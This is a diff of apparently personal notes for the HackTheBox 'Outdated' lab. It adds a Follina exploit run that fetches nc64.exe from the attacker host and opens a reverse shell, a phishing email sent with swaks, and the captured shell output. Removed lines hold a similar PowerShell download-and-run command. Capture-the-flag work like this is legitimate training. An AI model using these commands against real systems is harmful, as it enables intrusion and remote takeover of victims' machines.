@@ -112,16 +112,42 @@ https://github.com/JohnHammond/msdt-follina
 
 sudo vim /etc/hosts
 outdated.htb mail.outdated.htb
+```
+└─$ sudo python3 follina.py -i 10.10.16.8 -p 80 -c "Invoke-WebRequest http://10.10.16.8/nc64.exe -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe 10.10.16.8 1234"
+[+] copied staging doc /tmp/tuqxmos9
+[+] created maldoc ./follina.doc
+[+] serving html payload on :80
+10.129.57.67 - - [17/Sep/2022 13:29:33] "GET / HTTP/1.1" 200 -
+10.129.57.67 - - [17/Sep/2022 13:29:37] code 404, message File not found
+10.129.57.67 - - [17/Sep/2022 13:29:37] "GET /nc64.exe HTTP/1.1" 404 -
+10.129.57.67 - - [17/Sep/2022 13:30:45] "GET / HTTP/1.1" 200 -
+10.129.57.67 - - [17/Sep/2022 13:30:45] "GET / HTTP/1.1" 200 -
+10.129.57.67 - - [17/Sep/2022 13:30:46] "GET /nc64.exe HTTP/1.1" 200 -
+10.129.57.67 - - [17/Sep/2022 13:30:46] "GET / HTTP/1.1" 200 -
+```
+```
+└─$ sudo cp nc64.exe /tmp/tuqxmos9/www
+```
+```
+└─$ sudo swaks --to itsupport@outdated.htb --from rogue@rogue --server mail.outdated.htb --body "http://10.10.16.8/"
+```
 
-└──╼ [★]$ sudo python3 follina.py -i 10.10.14.28 -p 8000
+```
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.16.8] from (UNKNOWN) [10.129.57.67] 49885
+Microsoft Windows [Version 10.0.19043.928]
+(c) Microsoft Corporation. All rights reserved.
 
-sudo swaks --to itsupport@outdated.htb --from rogue@rogue --server mail.outdated.htb --body "http://10.10.14.28/"
+C:\Users\btables\AppData\Local\Temp\SDIAG_cdf76fc7-158d-434e-aeb6-a8529783b38e>whoami
+whoami
+outdated\btables
 
-https://github.com/chvancooten/follina.py
+C:\Users\btables\AppData\Local\Temp\SDIAG_cdf76fc7-158d-434e-aeb6-a8529783b38e>S
+```
 
-sudo python3 follina.py -t docx -m command -c "powershell -c iwr -uri http://10.10.14.6/re.exe -outfile re.exe; ./re.exe" 
+![image](https://user-images.githubusercontent.com/105310322/190871592-ebc4c3ea-140d-4063-b9ea-0f4fe245d93a.png)
 
-sudo swaks --to itsupport@outdated.htb --from rogue@rogue --server mail.outdated.htb --body "http://10.10.14.113/exploit.html"
 
 https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1
 
@@ -134,7 +160,7 @@ https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/
     And UseWUServer is equals to 1, so it is vulnerable!
 ```
 
-cat base64 | base64 -d > SharpWSUS.gz
+cat base64 | base64 -d > SharpWSUS.gz 
 
 gzip -d SharpWSUS.gz
 
